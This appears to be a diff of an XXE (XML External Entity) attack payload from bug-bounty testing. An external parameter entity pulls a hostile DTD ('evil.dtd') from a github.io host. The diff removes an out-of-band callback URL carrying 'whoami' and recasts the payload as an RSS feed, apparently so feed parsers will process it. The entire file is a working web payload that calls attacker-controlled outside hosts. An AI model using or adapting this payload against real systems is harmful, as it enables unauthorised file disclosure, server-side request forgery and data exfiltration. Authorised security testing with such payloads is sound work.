@@ -1,5 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://walterbugbounty.github.io/XXE/evil.dtd"> %xxe;]>
-<root>
-  <url>https://5yi53z1s0p919f4yc3doegbdmdij7u59s.oast.site?x=whoami</url>
-</root>
+<rss version="2.0">
+  <channel>
+    <title>test</title>
+  </channel>
+</rss>
